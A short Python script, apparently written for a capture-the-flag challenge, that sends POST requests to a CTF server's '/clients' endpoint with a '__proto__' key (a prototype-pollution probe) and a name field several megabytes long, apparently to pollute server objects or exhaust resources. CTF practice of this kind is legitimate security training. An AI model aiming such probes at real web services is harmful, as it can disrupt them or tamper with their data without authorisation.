import requests


URI = 'http://spooktoberctf.se:22083/clients'


def fetch(inp={}):
    retval = requests.post(URI, data=inp, timeout=1)
    t = retval.text
    if inp.get('__proto__', None) is not None:
        print()
    if retval.status_code != 200:
        print()
    return t



djuh = 'a' * 4000000

data = fetch({'__proto__': 'djuh', 'name': 'Jason'*1000000})

print()